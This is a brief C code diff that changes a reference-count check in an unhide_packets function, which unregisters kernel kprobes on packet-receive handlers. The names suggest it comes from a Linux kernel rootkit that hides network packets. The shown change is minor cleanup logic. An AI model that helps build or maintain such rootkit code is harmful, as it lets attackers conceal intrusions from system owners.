@@ -75,7 +75,7 @@ hide_packets(void)
 void
 unhide_packets(void)
 {
-    if (atomic_dec_return(&getdents_install_count) == 0) {
+    if (atomic_dec_return(&getdents_install_count) < 1) {
         unregister_kprobe(&p_rcv);
         unregister_kprobe(&tp_rcv);
         unregister_kprobe(&p_rcv_spkt);
